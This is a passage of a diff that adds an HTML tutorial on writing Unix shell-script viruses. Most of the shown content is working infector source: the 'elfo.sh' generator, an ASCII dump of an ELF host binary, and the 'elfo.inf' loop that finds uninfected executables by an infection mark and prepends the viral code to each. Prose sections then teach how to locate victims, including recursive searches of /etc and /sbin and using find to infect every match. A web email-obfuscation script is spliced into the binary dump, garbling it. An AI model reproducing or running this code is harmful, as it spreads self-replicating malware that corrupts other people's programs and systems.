+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">' TAM=$(expr $(cat $F|wc --bytes|tr -d &quot; &quot;) + 1)'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">' cp $F .$F.tmp -a'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">' {'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">' head -27 $1'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">printf</span> <span style="color: #ff0000;">&quot; printf 'tail -c'<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">' printf &quot;$TAM&quot;'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">printf</span> <span style="color: #ff0000;">' printf \x27 $0 &gt; .$0.exe 2&gt;/dev/null\\n\x27\n'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">printf</span> <span style="color: #ff0000;">' echo \x27 chmod +x .$0.exe 2&gt;/dev/null\x27\n'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">printf</span> <span style="color: #ff0000;">' echo \x27./.$0.exe $*\x27\n'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">printf</span> <span style="color: #ff0000;">' echo \x27rm .$0.exe 2&gt;/dev/null\x27\n'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">' echo exit 0'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">' } &gt; .$F.tmp 2&gt;/dev/null'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">' cat $F &gt;&gt; .$F.tmp'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">' echo &gt;&gt; .$F.tmp'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">' mv .$F.tmp $F'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">' fi'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'done'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'rm $0 2&gt;/dev/null'</span><br/>
+<span style="color: black;">&#125;</span> <span style="color: #000000; font-weight: bold;">&gt;</span> .<span style="color: #007800;">$0</span>.inf <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+<span style="color: #c20cb9; font-weight: bold;">sh</span> .<span style="color: #000000; font-weight: bold;">/</span>.<span style="color: #007800;">$0</span>.inf <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&amp;</span><br/>
+<span style="color: #c20cb9; font-weight: bold;">tail</span> <span style="color: #660033;">-c716</span> <span style="color: #007800;">$0</span> <span style="color: #000000; font-weight: bold;">&gt;</span> .<span style="color: #007800;">$0</span>.exe <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+<span style="color: #c20cb9; font-weight: bold;">chmod</span> +x .<span style="color: #007800;">$0</span>.exe <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+.<span style="color: #000000; font-weight: bold;">/</span>.<span style="color: #007800;">$0</span>.exe <span style="color: #007800;">$*</span><br/>
+<span style="color: #c20cb9; font-weight: bold;">rm</span> .<span style="color: #007800;">$0</span>.exe <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+<span style="color: #7a0874; font-weight: bold;">exit</span> <span style="color: #000000;">0</span><br/>
+^?ELF^A^A^A^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^B^<span style="color: #000000; font-weight: bold;">@</span>^C^<span style="color: #000000; font-weight: bold;">@</span>^A^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>\x82\x80^D^H4^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>\xcc<br/>
+^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>4^<span style="color: #000000; font-weight: bold;">@</span> ^<span style="color: #000000; font-weight: bold;">@</span>^B^<span style="color: #000000; font-weight: bold;">@</span><span style="color: black;">&#40;</span>^<span style="color: #000000; font-weight: bold;">@</span>^G^<span style="color: #000000; font-weight: bold;">@</span>^D^<span style="color: #000000; font-weight: bold;">@</span>^A^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>\x80^D^H^<span style="color: #000000; font-weight: bold;">@</span>\x80<br/>
+^D^H\xa0^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>\xa0^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^E^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^P^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^A^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>\xa0^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>\xa0\x90<br/>
+^D^H\xa0\x90^D^H^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^F^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^P^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>Hello, world<span style="color: #000000; font-weight: bold;">!</span><br/>
+\xba^N^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>\xb9t\x80^D^H\xbb^A^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>\xb8^D^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>\xcd\x80\xb8^A^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span><br/>
+^<span style="color: #000000; font-weight: bold;">@</span>\xcd\x80\x90^<span style="color: #000000; font-weight: bold;">@</span>.symtab^<span style="color: #000000; font-weight: bold;">@</span>.strtab^<span style="color: #000000; font-weight: bold;">@</span>.shstrtab^<span style="color: #000000; font-weight: bold;">@</span>.text^<span style="color: #000000; font-weight: bold;">@</span>.data^<span style="color: #000000; font-weight: bold;">@</span>.bss^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span><br/>
+^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span><br/>
+^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: black;">&#91;</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^A^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^F^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>t\x80^D^Ht^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>,^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span><br/>
+^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^D^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@!</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^A^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^C^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>\xa0\x90^D^H\xa0^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span><br/>
+^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^D^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span><span style="color: #ff0000;">'^@^@^@^H^@^@^@^C^@^@^@\xa0<br/>
+\x90^D^H\xa0^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^D^@^@^@^@^@^@^@^Q^@^@^@^C<br/>
+^@^@^@^@^@^@^@^@^@^@^@\xa0^@^@^@,^@^@^@^@^@^@^@^@^@^@^@^A^@^@^@^@^@<br/>
+^@^@^A^@^@^@^B^@^@^@^@^@^@^@^@^@^@^@\xe4^A^@^@\xc0^@^@^@^F^@^@^@^G<br/>
+^@^@^@^D^@^@^@^P^@^@^@ &nbsp;^@^@^@^C^@^@^@^@^@^@^@^@^@^@^@\xa4^B^@^@'</span>^<span style="color: #000000; font-weight: bold;">@</span><br/>
+^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^A^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span><br/>
+^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>t\x80^D^H^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^C^<span style="color: #000000; font-weight: bold;">@</span>^A^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>\xa0\x90^D^H^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span><br/>
+^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span>\xa4^B^<span style="color: #000000; font-weight: bold;">@</span>^<span style="color: #000000; font-weight: bold;">@</span><span style="color: #ff0000;">'^@^@^@^@^@^@^@^@^@^@^@^A^@^@^@^@^@^@^@^@^@<br/>
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b7e9f7c3">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>\x80^D^H^@^@^@^@^C^@^A^@^@^@^@<br/>
+^@\xa0\x90^D^H^@^@^@^@^C^@^B^@^@^@^@^@\xa0\x90^D^H^@^@^@^@^C^@^C^@<br/>
+^@^@^@^@^@^@^@^@^@^@^@^@^C^@^D^@^@^@^@^@^@^@^@^@^@^@^@^@^C^@^E^@^@<br/>
+^@^@^@^@^@^@^@^@^@^@^@^C^@^F^@^A^@^@^@\xa0\x80^D^H^@^@^@^@^Q^@\xf1<br/>
+\xff^H^@^@^@\x82\x80^D^H^@^@^@^@^P^@^A^@^O^@^@^@\xa0\x90^D^H^@^@^@<br/>
+^@^Q^@\xf1\xff^[^@^@^@\xa0\x90^D^H^@^@^@^@^Q^@\xf1\xff&quot;^@^@^@\xa0<br/>
+\x90^D^H^@^@^@^@^Q^@\xf1\xff^@_etext^@_start^@__bss_start^@_edata<br/>
+^@_end^@<br/>
+</span></div>
+<p>The first line is our infection mark ("#;P", ;P). After we have a block of "echo"'s and "printf"'s that generate the infector process in "hostname.inf", and execute it in background. The rest of the code lines are for copying the last 716 bytes of the file and reconstruct the "host" in "hostname.exe". After that, we call this file with the requested parameters ("$*") and the we delete it.</p>
+<p>[ NOTE: probably the code inserted here will not work, because we are converting a binary ELF file into ASCII mode. If you want to try the functional version of "elfo.sh", look at the tarball included ;-) ]</p>
+<p>The temporary files' names are taken from the from the original file, so other infected files are not executed at the same time and write into the same temporary file.</p>
+<p>To create an effective infector process we have to avoid that the variables are interpreted by the shell ("$0", "$TAM"). To do this we generate simple quotations by using the "printf" command ("printf '\x27'"), generating the following code:</p>
+<p><strong>elfo.inf</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">for</span> F <span style="color: #000000; font-weight: bold;">in</span> <span style="color: #000000; font-weight: bold;">*</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-f</span> <span style="color: #007800;">$F</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-x</span> <span style="color: #007800;">$F</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: black;">&#91;</span> <span style="color: #ff0000;">&quot;<span style="color: #007800;">$(head -c3 $F)</span>&quot;</span> <span style="color: #000000; font-weight: bold;">!</span>= <span style="color: #ff0000;">&quot;#;P&quot;</span> <span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #007800;">TAM</span>=$<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">expr</span> $<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #007800;">$F</span><span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">wc</span> <span style="color: #660033;">--bytes</span><span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">tr</span> <span style="color: #660033;">-d</span> <span style="color: #ff0000;">&quot; &quot;</span><span style="color: black;">&#41;</span> + <span style="color: #000000;">1</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">cp</span> <span style="color: #007800;">$F</span> .<span style="color: #007800;">$F</span>.tmp <span style="color: #660033;">-a</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">head</span> <span style="color: #660033;">-27</span> <span style="color: #007800;">$1</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">printf</span> <span style="color: #ff0000;">'tail -c'</span>\n<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">printf</span> <span style="color: #ff0000;">&quot;<span style="color: #007800;">$TAM</span>&quot;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">printf</span> <span style="color: #ff0000;">'$0 &gt; .$0.exe 2&gt;/dev/null\n'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'chmod +x .$0.exe 2&gt;/dev/null'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'./.$0.exe $*'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #ff0000;">'rm .$0.exe 2&gt;/dev/null'</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #7a0874; font-weight: bold;">exit</span> <span style="color: #000000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span> <span style="color: #000000; font-weight: bold;">&gt;</span> .<span style="color: #007800;">$F</span>.tmp <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&gt;/</span>dev<span style="color: #000000; font-weight: bold;">/</span>null<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #007800;">$F</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> .<span style="color: #007800;">$F</span>.tmp<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #000000; font-weight: bold;">&gt;&gt;</span> .<span style="color: #007800;">$F</span>.tmp<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #c20cb9; font-weight: bold;">mv</span> .<span style="color: #007800;">$F</span>.tmp <span style="color: #007800;">$F</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">fi</span><br/>
+<span style="color: #000000; font-weight: bold;">done</span><br/>
+&nbsp;</div>
+<p>which will be the one that searches in the current directory for executable files that are not infected ("if [ -f $F ] &amp;&amp; [ -x $F ] &amp;&amp; [ "$head -c4 $F)" != "#;P" ]") and generate a similar code to "elfo.sh" with them :-)</p>
+<h3><a name="c32"></a>3.2. Search for objectives</h3>
+<h4><a name="c321"></a>3.2.1. Possible victim detection</h4>
+<p>A very important thing in a virus' extension is the detection of its possible victims. If we infect files that are not shell script viruses we can make them useless because they will stop working and that will not help the virus to keep extending. That's why we have to work out something to detect shell scripts where we can stay.</p>
+<p>There are many possibilities on how to do it:</p>
+<ul>
+<li>with the file options that bash has we can know if the possible victim is a file or a directory, an executable file, etc. This can be a first aproximation, but, for example, we cannot distinguish between different executable files (shell scripts, perl scripts, ELFs...).</li>
+<li>with the "file" command, which tells us what kind of file is the one specified as a parameter. This has some disadvantages, which are that it is not completely standard in a UNIX system (debian, for example dos not install it by default) and if a script has no header (for example the string '#!/bin/sh'), it says that is a plain text (ASCII text).</li>
+<li>with the "head" command, which allows extracting characters and strings from the beginning of a file. If we ask for the first 9 characters of a file, and they coincide with '#!/bin/sh' then it will be a bash script, so it could be our host.</li>
+<li>with the "find" command, which makes recursive searches starting from the given directory, and can classify permissions, names, etc. It can be a big load for the system to find files in this way, but as we explained before, we can run this process in background.</li>
+<li>with the "grep" command, which searches for strings in the given files. An example on how to do this is in over2.sh, from the chapter 3.1.1.</li>
+</ul>
+<p>Any of these ways to find a victim are as the others, but we just have to decide how many system load we want to add to our virus, because the easiest ways can find fewer victims, but are quicker, and viceversa.</p>
+<h4><a name="c322"></a>3.2.2. How and where do we find them?</h4>
+<p>All the techniques explained in the previous chapter need to stablish a beginning point for the search.</p>
+<p>The most usual thing in simple viruses is to attack the current directory, which is a poor technique because shell scripts do not vary their location in the directory tree.</p>
+<p>Another strategy is to descend directories following the ".." pattern until we reach the root directory: we infect the current directory and descend to the upper directory (cd ..), and so on. Is a bit slow and not very exhaustive, it does not range the whole directory tree.</p>
+<p>The same way, we can make a recursive search for files, starting from the root directory or from an adequate directory like "/etc/" or "/sbin/" and descending to every branch or subdirectory looking for victims.</p>
+<p>A third searching strategy could be the use of a specific file search command like "find". "find" return a list of the files that match the given conditions. Among this conditions you can specify the file type, permissions, name, size, etc. The most usual thing is to request the file list and handle it as usual, but "find" can give an important functionality: it is able to execute an action for every item found, so we can ask it to infect every found file.</p>
+<p>For this three search strategies is recommended to use the background execution previously commented, to avoid long executions in the host, because the search for objectives often takes time.</p>
+<p>The last strategy that I can think of is to try to attack the most usual scripts in all UNIX systems, like the ones that can be found at "/etc/" or "/sbin/". The main idea is to make a list of "attractive" directories and give it to a "for" so we can find something in them.</p>
+<p>Here's a text file with some examples on how to put in practice the explained techniques:</p>
+<p><strong>where1.sh.txt</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;"># Current directory (pwd)</span><br/>
